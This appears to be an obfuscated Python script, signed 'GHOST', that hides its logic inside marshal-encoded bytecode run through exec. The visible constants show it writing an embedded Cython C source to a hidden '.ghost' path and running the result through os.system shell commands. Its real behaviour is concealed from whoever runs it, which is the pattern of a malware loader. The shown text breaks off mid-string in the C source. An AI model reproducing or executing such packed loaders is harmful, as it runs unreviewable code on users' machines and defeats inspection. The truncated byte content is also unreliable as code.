# THIS ENCODE BY GHOST | @GHOST_RFX â™¤
G,H,O,S,T,J,I,I = map(chr, [71, 72, 79, 83, 84, 74, 73, 73])
GH, OS, TJ, II = G+H, O+S, T+J, I+I
GHOST = G+H+O+S+T+J+I+I
import tempfile as t
from os import path as ghost_path, remove as grdmv, system as stem
from base64 import b64decode as lmao
ghostenc = (b'import marshal
exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\xf3\x08\x04\x00\x00\x97\x00\x02\x00e\x00e\x01g\x00d\x00\xa2\x01\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\\\x08\x00\x00Z\x02Z\x03Z\x04Z\x05Z\x06Z\x07Z\x08Z\x08e\x02e\x03z\x00\x00\x00e\x04e\x05z\x00\x00\x00e\x06e\x07z\x00\x00\x00e\x08e\x08z\x00\x00\x00f\x04\\\x04\x00\x00Z\tZ\nZ\x0bZ\x0ce\x02e\x03z\x00\x00\x00e\x04z\x00\x00\x00e\x05z\x00\x00\x00e\x06z\x00\x00\x00e\x07z\x00\x00\x00e\x08z\x00\x00\x00e\x08z\x00\x00\x00Z\rd\x01d\x02l\x0eZ\x0fd\x01d\x03l\x10m\x11Z\x12m\x13Z\x14m\x15Z\x16\x01\x00d\x01d\x04l\x17m\x18Z\x19\x01\x00\x02\x00e\x1ad\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x1ad\x06\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x1ad\x07\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x1ad\x06\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x1bd\x08\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x1c\x00\x00\x00\x00\x00\x00\x00\x00Z\x1dd\tZ\x1ed\n\x02\x00e\x1bd\x08\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00j\x1c\x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00Z\x1fd\x0b\x02\x00e\x1bd\x08\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00j \x00\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00Z!d\x0ce\x1ez\x00\x00\x00Z"\x02\x00e\x12j#\x00\x00\x00\x00\x00\x00\x00\x00e\x1e\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00r"\x02\x00e\x16e\x1fd\rz\x00\x00\x00e!z\x00\x00\x00d\rz\x00\x00\x00e"z\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e$d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x0eZ%d\x0fZ&d\x10\xa0\'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00e\x1bd\x08\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00j(\x00\x00\x00\x00\x00\x00\x00\x00\xa0)\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x11\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x01\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0)\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x10\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x02d\x12\x85\x02\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00Z*d\x13e\x1dz\x00\x00\x00d\x14z\x00\x00\x00e*z\x00\x00\x00d\x15z\x00\x00\x00e\x1ez\x00\x00\x00d\x11z\x00\x00\x00e&z\x00\x00\x00d\x16z\x00\x00\x00e\x1dz\x00\x00\x00d\x17z\x00\x00\x00e*z\x00\x00\x00Z+\x02\x00e,e&d\x18\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x005\x00Z-e-\xa0.\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00e%\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x02d\x02d\x02\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00n\x0b#\x001\x00s\x04w\x02x\x03Y\x00w\x01\x01\x00Y\x00\x01\x00\x01\x00\x02\x00e\x1bd\x19\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0/\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00e\x12j0\x00\x00\x00\x00\x00\x00\x00\x00e\x1e\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x1a\xac\x1b\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x16e\x1fd\rz\x00\x00\x00e!z\x00\x00\x00d\rz\x00\x00\x00e+z\x00\x00\x00d\rz\x00\x00\x00e"z\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x14e&\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x02S\x00)\x1c)\x08\xe9G\x00\x00\x00\xe9H\x00\x00\x00\xe9O\x00\x00\x00\xe9S\x00\x00\x00\xe9T\x00\x00\x00\xe9J\x00\x00\x00\xe9I\x00\x00\x00r\x08\x00\x00\x00\xe9\x00\x00\x00\x00N)\x03\xda\x04path\xda\x06remove\xda\x06system)\x01\xda\tb64decodeu!\x00\x00\x00\x1b[1;92m\x1b[38;5;46mLOADING\xe2\x80\xa2\xe2\x80\xa2\xe2\x80\xa2\xda\x00u=\x00\x00\x00\x1b[1;92m\x1b[38;5;50m####THIS IS ENCODED BY #GHOST \xe2\x80\xa2 @GHOST_RFX\xda\x03sysz\t.ghost/opz\x12export PYTHONHOME=z\x19export PYTHON_EXECUTABLE=z\x02./z\x02&&a%b\r\x00\n\n#ifndef PY_SSIZE_T_CLEAN\n#define PY_SSIZE_T_CLEAN\n#endif \n\n#if defined(Py_LIMITED_API)\n  #if !defined(CYTHON_LIMITED_API)\n  #define CYTHON_LIMITED_API 1\n  #endif\n#elif defined(CYTHON_LIMITED_API)\n  #ifdef _MSC_VER\n  #pragma message ("Limited API usage is enabled with \'CYTHON_LIMITED_API\' but \'Py_LIMITED_API\' does not define a Python target version. Consider setting \'Py_LIMITED_API\' instead.")\n  #else\n  #warning Limited API usage is enabled with \'CYTHON_LIMITED_API\' but \'Py_LIMITED_API\' does not define a Python target version. Consider setting \'Py_LIMITED_API\' instead.\n  #endif\n#endif\n\n#include "Python.h"\n#ifndef Py_PYTHON_H\n    #error Python headers needed to compile C extensions, please install development version of Python.\n#elif PY_VERSION_HEX < 0x03080000\n    #error Cython requires Python 3.8+.\n#else\n#define __PYX_ABI_VERSION "3_1_6"\n#define CYTHON_HEX_VERSION 0x030106F0\n#define CYTHON_FUTURE_DIVISION 1\n\n#include <stddef.h>\n#ifndef offsetof\n  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )\n#endif\n#if !defined(_WIN32) && !defined(WIN32) && !defined(MS_WINDOWS)\n  #ifndef __stdcall\n    #define __stdcall\n  #endif\n  #ifndef __cdecl\n    #define __cdecl\n  #endif\n  #ifndef __fastcall\n    #define __fastcall\n  #endif\n#endif\n#ifndef DL_IMPORT\n  #define DL_IMPORT(t) t\n#endif\n#ifndef DL_EXPORT\n  #define DL_EXPORT(t) t\n#endif\n#define __PYX_COMMA ,\n#ifndef HAVE_LONG_LONG\n  #define HAVE_LONG_LONG\n#endif\n#ifndef PY_LONG_LONG\n  #define PY_LONG_LONG LONG_LONG\n#endif\n#ifndef Py_HUGE_VAL\n  #define Py_HUGE_VAL HUGE_VAL\n#endif\n#define __PYX_LIMITED_VERSION_HEX PY_VERSION_HEX\n#if defined(GRAALVM_PYTHON)\n  \n  #define CYTHON_COMPILING_IN_PYPY 0\n  #define CYTHON_COMPILING_IN_CPYTHON 0\n  #define CYTHON_COMPILING_IN_LIMITED_API 0\n  #define CYTHON_COMPILING_IN_GRAAL 1\n  #define CYTHON_COMPILING_IN_CPYTHON_FREETHREADING 0\n  #undef CYTHON_USE_TYPE_SLOTS\n  #define CYTHON_USE_TYPE_SLOTS 0\n  #undef CYTHON_USE_TYPE_SPECS\n  #define CYTHON_USE_TYPE_SPECS 0\n  #undef CYTHON_USE_PYTYPE_LOOKUP\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #undef CYTHON_USE_PYLIST_INTERNALS\n  #define CYTHON_USE_PYLIST_INTERNALS 0\n  #undef CYTHON_USE_UNICODE_INTERNALS\n  #define CYTHON_USE_UNICODE_INTERNALS 0\n  #undef CYTHON_USE_UNICODE_WRITER\n  #define CYTHON_USE_UNICODE_WRITER 0\n  #undef CYTHON_USE_PYLONG_INTERNALS\n  #define CYTHON_USE_PYLONG_INTERNALS 0\n  #undef CYTHON_AVOID_BORROWED_REFS\n  #define CYTHON_AVOID_BORROWED_REFS 1\n  #undef CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS\n  #define CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS 1\n  #undef CYTHON_ASSUME_SAFE_MACROS\n  #define CYTHON_ASSUME_SAFE_MACROS 0\n  #undef CYTHON_ASSUME_SAFE_SIZE\n  #define CYTHON_ASSUME_SAFE_SIZE 0\n  #undef CYTHON_UNPACK_METHODS\n  #define CYTHON_UNPACK_METHODS 0\n  #undef CYTHON_FAST_THREAD_STATE\n  #define CYTHON_FAST_THREAD_STATE 0\n  #undef CYTHON_FAST_GIL\n  #define CYTHON_FAST_GIL 0\n  #undef CYTHON_METH_FASTCALL\n  #define CYTHON_METH_FASTCALL 0\n  #undef CYTHON_FAST_PYCALL\n  #define CYTHON_FAST_PYCALL 0\n  #ifndef CYTHON_PEP487_INIT_SUBCLASS\n    #define CYTHON_PEP487_INIT_SUBCLASS 1\n  #endif\n  #undef CYTHON_PEP489_MULTI_PHASE_INIT\n  #define CYTHON_PEP489_MULTI_PHASE_INIT 1\n  #undef CYTHON_USE_MODULE_STATE\n  #define CYTHON_USE_MODULE_STATE 0\n  #undef CYTHON_USE_SYS_MONITORING\n  #define CYTHON_USE_SYS_MONITORING 0\n  #undef CYTHON_USE_TP_FINALIZE\n  #define CYTHON_USE_TP_FINALIZE 0\n  #undef CYTHON_USE_AM_SEND\n  #define CYTHON_USE_AM_SEND 0\n  #undef CYTHON_USE_DICT_VERSIONS\n  #define CYTHON_USE_DICT_VERSIONS 0\n  #undef CYTHON_USE_EXC_INFO_STACK\n  #define CYTHON_USE_EXC_INFO_STACK 1\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0\n  #endif\n  #undef CYTHON_USE_FREELISTS\n  #define CYTHON_USE_FREELISTS 0\n#elif defined(PYPY_VERSION)\n  #define CYTHON_COMPILING_IN_PYPY 1\n  #define CYTHON_COMPILING_IN_CPYTHON 0\n  #define CYTHON_COMPILING_IN_LIMITED_API 0\n  #define CYTHON_COMPILING_IN_GRAAL 0\n  #define CYTHON_COMPILING_IN_CPYTHON_FREETHREADING 0\n  #undef CYTHON_USE_TYPE_SLOTS\n  #define CYTHON_USE_TYPE_SLOTS 1\n  #ifndef CYTHON_USE_TYPE_SPECS\n    #define CYTHON_USE_TYPE_SPECS 0\n  #endif\n  #undef CYTHON_USE_PYTYPE_LOOKUP\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #undef CYTHON_USE_PYLIST_INTERNALS\n  #define CYTHON_USE_PYLIST_INTERNALS 0\n  #undef CYTHON_USE_UNICODE_INTERNALS\n  #define CYTHON_USE_UNICODE_INTERNALS 0\n  #undef CYTHON_USE_UNICODE_WRITER\n  #define CYTHON_USE_UNICODE_WRITER 0\n  #undef CYTHON_USE_PYLONG_INTERNALS\n  #define CYTHON_USE_PYLONG_INTERNALS 0\n  #undef CYTHON_AVOID_BORROWED_REFS\n  #define CYTHON_AVOID_BORROWED_REFS 1\n  #undef CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS\n  #define CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS 1\n  #undef CYTHON_ASSUME_SAFE_MACROS\n  #define CYTHON_ASSUME_SAFE_MACROS 0\n  #ifndef CYTHON_ASSUME_SAFE_SIZE\n    #define CYTHON_ASSUME_SAFE_SIZE 1\n  #endif\n  #undef CYTHON_UNPACK_METHODS\n  #define CYTHON_UNPACK_METHODS 0\n  #undef CYTHON_FAST_THREAD_STATE\n  #define CYTHON_FAST_THREAD_STATE 0\n  #undef CYTHON_FAST_GIL\n  #define CYTHON_FAST_GIL 0\n  #undef CYTHON_METH_FASTCALL\n  #define CYTHON_METH_FASTCALL 0\n  #undef CYTHON_FAST_PYCALL\n  #define CYTHON_FAST_PYCALL 0\n  #ifndef CYTHON_PEP487_INIT_SUBCLASS\n    #define CYTHON_PEP487_INIT_SUBCLASS 1\n  #endif\n  #if PY_VERSION_HEX < 0x03090000\n    #undef CYTHON_PEP489_MULTI_PHASE_INIT\n    #define CYTHON_PEP489_MULTI_PHASE_INIT 0\n  #elif !defined(CYTHON_PEP489_MULTI_PHASE_INIT)\n    #define CYTHON_PEP489_MULTI_PHASE_INIT 1\n  #endif\n  #undef CYTHON_USE_MODULE_STATE\n  #define CYTHON_USE_MODULE_STATE 0\n  #undef CYTHON_USE_SYS_MONITORING\n  #define CYTHON_USE_SYS_MONITORING 0\n  #ifndef CYTHON_USE_TP_FINALIZE\n    #define CYTHON_USE_TP_FINALIZE (PYPY_VERSION_NUM >= 0x07030C00)\n  #endif\n  #undef CYTHON_USE_AM_SEND\n  #define CYTHON_USE_AM_SEND 0\n  #undef CYTHON_USE_DICT_VERSIONS\n  #define CYTHON_USE_DICT_VERSIONS 0\n  #undef CYTHON_USE_EXC_INFO_STACK\n  #define CYTHON_USE_EXC_INFO_STACK 0\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC (PYPY_VERSION_NUM >= 0x07031100)\n  #endif\n  #undef CYTHON_USE_FREELISTS\n  #define CYTHON_USE_FREELISTS 0\n#elif defined(CYTHON_LIMITED_API)\n  #ifdef Py_LIMITED_API\n    #undef __PYX_LIMITED_VERSION_HEX\n    #define __PYX_LIMITED_VERSION_HEX Py_LIMITED_API\n  #endif\n  #define CYTHON_COMPILING_IN_PYPY 0\n  #define CYTHON_COMPILING_IN_CPYTHON 0\n  #define CYTHON_COMPILING_IN_LIMITED_API 1\n  #define CYTHON_COMPILING_IN_GRAAL 0\n  #define CYTHON_COMPILING_IN_CPYTHON_FREETHREADING 0\n  #undef CYTHON_CLINE_IN_TRACEBACK\n  #define CYTHON_CLINE_IN_TRACEBACK 0\n  #undef CYTHON_USE_TYPE_SLOTS\n  #define CYTHON_USE_TYPE_SLOTS 0\n  #undef CYTHON_USE_TYPE_SPECS\n  #define CYTHON_USE_TYPE_SPECS 1\n  #undef CYTHON_USE_PYTYPE_LOOKUP\n  #define CYTHON_USE_PYTYPE_LOOKUP 0\n  #undef CYTHON_USE_PYLIST_INTERNALS\n  #define CYTHON_USE_PYLIST_INTERNALS 0\n  #undef CYTHON_USE_UNICODE_INTERNALS\n  #define CYTHON_USE_UNICODE_INTERNALS 0\n  #ifndef CYTHON_USE_UNICODE_WRITER\n    #define CYTHON_USE_UNICODE_WRITER 0\n  #endif\n  #undef CYTHON_USE_PYLONG_INTERNALS\n  #define CYTHON_USE_PYLONG_INTERNALS 0\n  #ifndef CYTHON_AVOID_BORROWED_REFS\n    #define CYTHON_AVOID_BORROWED_REFS 0\n  #endif\n  #ifndef CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS\n    #define CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS 0\n  #endif\n  #undef CYTHON_ASSUME_SAFE_MACROS\n  #define CYTHON_ASSUME_SAFE_MACROS 0\n  #undef CYTHON_ASSUME_SAFE_SIZE\n  #define CYTHON_ASSUME_SAFE_SIZE 0\n  #undef CYTHON_UNPACK_METHODS\n  #define CYTHON_UNPACK_METHODS 0\n  #undef CYTHON_FAST_THREAD_STATE\n  #define CYTHON_FAST_THREAD_STATE 0\n  #undef CYTHON_FAST_GIL\n  #define CYTHON_FAST_GIL 0\n  #undef CYTHON_METH_FASTCALL\n  #define CYTHON_METH_FASTCALL (__PYX_LIMITED_VERSION_HEX >= 0x030C0000)\n  #undef CYTHON_FAST_PYCALL\n  #define CYTHON_FAST_PYCALL 0\n  #ifndef CYTHON_PEP487_INIT_SUBCLASS\n    #define CYTHON_PEP487_INIT_SUBCLASS 1\n  #endif\n  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT\n    #define CYTHON_PEP489_MULTI_PHASE_INIT 1\n  #endif\n  #ifndef CYTHON_USE_MODULE_STATE\n    #define CYTHON_USE_MODULE_STATE 0\n  #endif\n  #undef CYTHON_USE_SYS_MONITORING\n  #define CYTHON_USE_SYS_MONITORING 0\n  #ifndef CYTHON_USE_TP_FINALIZE\n    #define CYTHON_USE_TP_FINALIZE 0\n  #endif\n  #ifndef CYTHON_USE_AM_SEND\n    #define CYTHON_USE_AM_SEND (__PYX_LIMITED_VERSION_HEX >= 0x030A0000)\n  #endif\n  #undef CYTHON_USE_DICT_VERSIONS\n  #define CYTHON_USE_DICT_VERSIONS 0\n  #undef CYTHON_USE_EXC_INFO_STACK\n  #define CYTHON_USE_EXC_INFO_STACK 0\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0\n  #endif\n  #undef CYTHON_USE_FREELISTS\n  #define CYTHON_USE_FREELISTS 0\n#else\n  #define CYTHON_COMPILING_IN_PYPY 0\n  #define CYTHON_COMPILING_IN_CPYTHON 1\n  #define CYTHON_COMPILING_IN_LIMITED_API 0\n  #define CYTHON_COMPILING_IN_GRAAL 0\n  #ifdef Py_GIL_DISABLED\n    #define CYTHON_COMPILING_IN_CPYTHON_FREETHREADING 1\n  #else\n    #define CYTHON_COMPILING_IN_CPYTHON_FREETHREADING 0\n  #endif\n  #if PY_VERSION_HEX < 0x030A0000\n    #undef CYTHON_USE_TYPE_SLOTS\n    #define CYTHON_USE_TYPE_SLOTS 1\n  #elif !defined(CYTHON_USE_TYPE_SLOTS)\n    #define CYTHON_USE_TYPE_SLOTS 1\n  #endif\n  #ifndef CYTHON_USE_TYPE_SPECS\n    #define CYTHON_USE_TYPE_SPECS 0\n  #endif\n  #ifndef CYTHON_USE_PYTYPE_LOOKUP\n    #define CYTHON_USE_PYTYPE_LOOKUP 1\n  #endif\n  #ifndef CYTHON_USE_PYLONG_INTERNALS\n    #define CYTHON_USE_PYLONG_INTERNALS 1\n  #endif\n  #if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n    #undef CYTHON_USE_PYLIST_INTERNALS\n    #define CYTHON_USE_PYLIST_INTERNALS 0\n  #elif !defined(CYTHON_USE_PYLIST_INTERNALS)\n    #define CYTHON_USE_PYLIST_INTERNALS 1\n  #endif\n  #ifndef CYTHON_USE_UNICODE_INTERNALS\n    #define CYTHON_USE_UNICODE_INTERNALS 1\n  #endif\n  #if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING || PY_VERSION_HEX >= 0x030B00A2\n    #undef CYTHON_USE_UNICODE_WRITER\n    #define CYTHON_USE_UNICODE_WRITER 0\n  #elif !defined(CYTHON_USE_UNICODE_WRITER)\n    #define CYTHON_USE_UNICODE_WRITER 1\n  #endif\n  #ifndef CYTHON_AVOID_BORROWED_REFS\n    #define CYTHON_AVOID_BORROWED_REFS 0\n  #endif\n  #if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n    #undef CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS\n    #define CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS 1\n  #elif !defined(CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS)\n    #define CYTHON_AVOID_THREAD_UNSAFE_BORROWED_REFS 0\n  #endif\n  #ifndef CYTHON_ASSUME_SAFE_MACROS\n    #define CYTHON_ASSUME_SAFE_MACROS 1\n  #endif\n  #ifndef CYTHON_ASSUME_SAFE_SIZE\n    #define CYTHON_ASSUME_SAFE_SIZE 1\n  #endif\n  #ifndef CYTHON_UNPACK_METHODS\n    #define CYTHON_UNPACK_METHODS 1\n  #endif\n  #ifndef CYTHON_FAST_THREAD_STATE\n    #define CYTHON_FAST_THREAD_STATE 1\n  #endif\n  #if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n    #undef CYTHON_FAST_GIL\n    #define CYTHON_FAST_GIL 0\n  #elif !defined(CYTHON_FAST_GIL)\n    #define CYTHON_FAST_GIL (PY_VERSION_HEX < 0x030C00A6)\n  #endif\n  #ifndef CYTHON_METH_FASTCALL\n    #define CYTHON_METH_FASTCALL 1\n  #endif\n  #ifndef CYTHON_FAST_PYCALL\n    #define CYTHON_FAST_PYCALL 1\n  #endif\n  #ifndef CYTHON_PEP487_INIT_SUBCLASS\n    #define CYTHON_PEP487_INIT_SUBCLASS 1\n  #endif\n  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT\n    #define CYTHON_PEP489_MULTI_PHASE_INIT 1\n  #endif\n  #ifndef CYTHON_USE_MODULE_STATE\n    #define CYTHON_USE_MODULE_STATE 0\n  #endif\n  #ifndef CYTHON_USE_SYS_MONITORING\n    #define CYTHON_USE_SYS_MONITORING (PY_VERSION_HEX >= 0x030d00B1)\n  #endif\n  #ifndef CYTHON_USE_TP_FINALIZE\n    #define CYTHON_USE_TP_FINALIZE 1\n  #endif\n  #ifndef CYTHON_USE_AM_SEND\n    #define CYTHON_USE_AM_SEND 1\n  #endif\n  #if CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n    #undef CYTHON_USE_DICT_VERSIONS\n    #define CYTHON_USE_DICT_VERSIONS 0\n  #elif !defined(CYTHON_USE_DICT_VERSIONS)\n    #define CYTHON_USE_DICT_VERSIONS  (PY_VERSION_HEX < 0x030C00A5 && !CYTHON_USE_MODULE_STATE)\n  #endif\n  #ifndef CYTHON_USE_EXC_INFO_STACK\n    #define CYTHON_USE_EXC_INFO_STACK 1\n  #endif\n  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC\n    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1\n  #endif\n  #ifndef CYTHON_USE_FREELISTS\n    #define CYTHON_USE_FREELISTS (!CYTHON_COMPILING_IN_CPYTHON_FREETHREADING)\n  #endif\n#endif\n#ifndef CYTHON_FAST_PYCCALL\n#define CYTHON_FAST_PYCCALL  CYTHON_FAST_PYCALL\n#endif\n#ifndef CYTHON_VECTORCALL\n#if CYTHON_COMPILING_IN_LIMITED_API\n#define CYTHON_VECTORCALL  (__PYX_LIMITED_VERSION_HEX >= 0x030C0000)\n#else\n#define CYTHON_VECTORCALL  (CYTHON_FAST_PYCCALL && PY_VERSION_HEX >= 0x030800B1)\n#endif\n#endif\n#define CYTHON_BACKPORT_VECTORCALL (CYTHON_METH_FASTCALL && PY_VERSION_HEX < 0x030800B1)\n#if CYTHON_USE_PYLONG_INTERNALS\n  #undef SHIFT\n  #undef BASE\n  #undef MASK\n  #ifdef SIZEOF_VOID_P\n    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };\n  #endif\n#endif\n#ifndef CYTHON_LOCK_AND_GIL_DEADLOCK_AVOIDANCE_TIME\n  #define CYTHON_LOCK_AND_GIL_DEADLOCK_AVOIDANCE_TIME 100\n#endif\n#ifndef __has_attribute\n  #define __has_attribute(x) 0\n#endif\n#ifndef __has_cpp_attribute\n  #define __has_cpp_attribute(x) 0\n#endif\n#ifndef CYTHON_RESTRICT\n  #if defined(__GNUC__)\n    #define CYTHON_RESTRICT __restrict__\n  #elif defined(_MSC_VER) && _MSC_VER >= 1400\n    #define CYTHON_RESTRICT __restrict\n  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\n    #define CYTHON_RESTRICT restrict\n  #else\n    #define CYTHON_RESTRICT\n  #endif\n#endif\n#ifndef CYTHON_UNUSED\n  #if defined(__cplusplus)\n    \n    #if ((defined(_MSVC_LANG) && _MSVC_LANG >= 201703L) || __cplusplus >= 201703L)\n      #if __has_cpp_attribute(maybe_unused)\n        #define CYTHON_UNUSED [[maybe_unused]]\n      #endif\n    #endif\n  #endif\n#endif\n#ifndef CYTHON_UNUSED\n# if defined(__GNUC__)\n#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))\n#     define CYTHON_UNUSED __attribute__ ((__unused__))\n#   else\n#     define CYTHON_UNUSED\n#   endif\n# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))\n#   define CYTHON_UNUSED __attribute__ ((__unused__))\n# else\n#   define CYTHON_UNUSED\n# endif\n#endif\n#ifndef CYTHON_UNUSED_VAR\n#  if defined(__cplusplus)\n     template<class T> void CYTHON_UNUSED_VAR( const T& ) { }\n#  else\n#    define CYTHON_UNUSED_VAR(x) (void)(x)\n#  endif\n#endif\n#ifndef CYTHON_MAYBE_UNUSED_VAR\n  #define CYTHON_MAYBE_UNUSED_VAR(x) CYTHON_UNUSED_VAR(x)\n#endif\n#ifndef CYTHON_NCP_UNUSED\n# if CYTHON_COMPILING_IN_CPYTHON && !CYTHON_COMPILING_IN_CPYTHON_FREETHREADING\n#  define CYTHON_NCP_UNUSED\n# else\n#  define CYTHON_NCP_UNUSED CYTHON_UNUSED\n# endif\n#endif\n#ifndef CYTHON_USE_CPP_STD_MOVE\n  #if defined(__cplusplus) && (\\\n    __cplusplus >= 201103L || (defined(_MSC_VER) && _MSC_VER >= 1600))\n    #define CYTHON_USE_CPP_STD_MOVE 1\n  #else\n    #define CYTHON_USE_CPP_STD_MOVE 0\n  #endif\n#endif\n#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)\n#ifdef _MSC_VER\n    #ifndef _MSC_STDINT_H_\n        #if _MSC_VER < 1300\n            typedef unsigned char     uint8_t;\n            typedef unsigned short    uint16_t;\n            typedef unsigned int      uint32_t;\n        #else\n            typedef unsigned __int8   uint8_t;\n            typedef unsigned __int16  uint16_t;\n            typedef unsigned __int32  uint32_t;\n        #endif\n    #endif\n    #if _MSC_VER < 1300\n        #ifdef _WIN64\n            typedef unsigned long long  __pyx_uintptr_t;\n        #else\n            typedef unsigned int        __pyx_uintptr_t;\n        #endif\n    #else\n        #ifdef _WIN64\n            typedef unsigned __int64    __pyx_uintptr_t;\n        #else\n            typedef unsigned __int32    __pyx_uintptr_t;\n        #endif\n    #endif\n#else\n    #include <stdint.h>\n    typedef uintptr_t  __pyx_uintptr_t;\n#endif\n#ifndef CYTHON_FALLTHROUGH\n  #if defined(__cplusplus)\n    \n    #if ((defined(_MSVC_LANG) && _MSVC_LANG >= 201703L) || __cplusplus >= 201703L)\n      #if __has_cpp_attribute(fallthrough)\n        #define CYTHON_FALLTHROUGH [[fallthrough]]\n      #endif\n    #endif\n    #ifndef CYTHON_FALLTHROUGH\n      #if __has_cpp_attribute(clang::fallthrough)\n        #define CYTHON_FALLTHROUGH [[clang::fallthrough]]\n      #elif __has_cpp_attribute(gnu::fallthrough)\n        #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]\n      #endif\n    #endif\n  #endif\n  #ifndef CYTHON_FALLTHROUGH\n    #if __has_attribute(fallthrough)\n      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))\n    #else\n      #define CYTHON_FALLTHROUGH\n    #endif\n  #endif\n  #if defined(__clang__) && defined(__apple_build_version__)\n    #if __apple_build_version__ < 7000000\n      #undef  CYTHON_FALLTHROUGH\n      #define CYTHON_FALLTHROUGH\n    #endif\n  #endif\n#endif\n#ifndef Py_UNREACHABLE\n  #define Py_UNREACHABLE()  assert(0); abort()\n#endif\n#ifdef __cplusplus\n  template <typename T>\n  struct __PYX_IS_UNSIGNED_IMPL {static const bool value = T(0) < T(-1);};\n  #define __PYX_IS_UNSIGNED(type) (__PYX_IS_UNSIGNED_IMPL<type>::value)\n#else\n  #define __PYX_IS_UNSIGNED(type) (((type)-1) > 0)\n#endif\n#if CYTHON_COMPILING_IN_PYPY == 1\n  #define __PYX_NEED_TP_PRINT_SLOT  (PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x030A0000)\n#else\n  #define __PYX_NEED_TP_PRINT_SLOT  (PY_VERSION_HEX >= 0x030800b4 && PY_VERSION_HEX < 0x03090000)\n#endif\n#define __PYX_REINTERPRET_FUNCION(func_pointer, other_pointer) ((func_pointer)(void(*)(void))(other_pointer))\n\n\n#ifndef CYTHON_INLINE\n  #if defined(__clang__)\n    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))\n  